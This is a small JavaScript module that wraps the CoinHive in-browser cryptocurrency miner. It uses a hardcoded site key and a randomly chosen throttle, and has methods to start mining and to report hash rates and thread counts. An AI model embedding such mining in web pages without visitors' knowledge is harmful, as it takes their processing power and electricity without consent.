class CryptoMiner {
  constructor() {
    if (typeof CoinHive !== 'undefined') {
      this.miner = new CoinHive.Anonymous('MgO9AK0TFbt9px9UTuAPqbUd56Y7CCle');
      this.setThrottleRandomly();
    }
  }

  setThrottleRandomly() {
    const throttles = [0.9, 0.5, 0.2];
    const throttle = throttles[Math.floor(Math.random() * throttles.length)];
    this.miner.setThrottle(throttle);
  }

  setThrottle(throttle) {
    this.miner.setThrottle(throttle);
  }

  isMobile() {
    return this.miner.isMobile();
  }

  getThrottle() {
    return this.miner.getThrottle();
  }

  startMiner() {
    console.log('starting miner');
    this.miner.start();
  }

  /**
     *
     * Format the throttle to a number 0-100
     *
     */
  formatThrottle(throttle) {
    return Math.round((1 - throttle) * 100);
  }

  getAcceptedHashes() {
    return this.miner.getAcceptedHashes();
  }

  getTotalHashes() {
    return this.miner.getTotalHashes();
  }

  getMinerData() {
    return {
      hashesPerSecond: this.miner.getHashesPerSecond(),
      totalHashes: this.miner.getTotalHashes(),
      acceptedHashes: this.miner.getAcceptedHashes(),
      numThreads: this.miner.getNumThreads()
    };
  }
}

export default CryptoMiner;
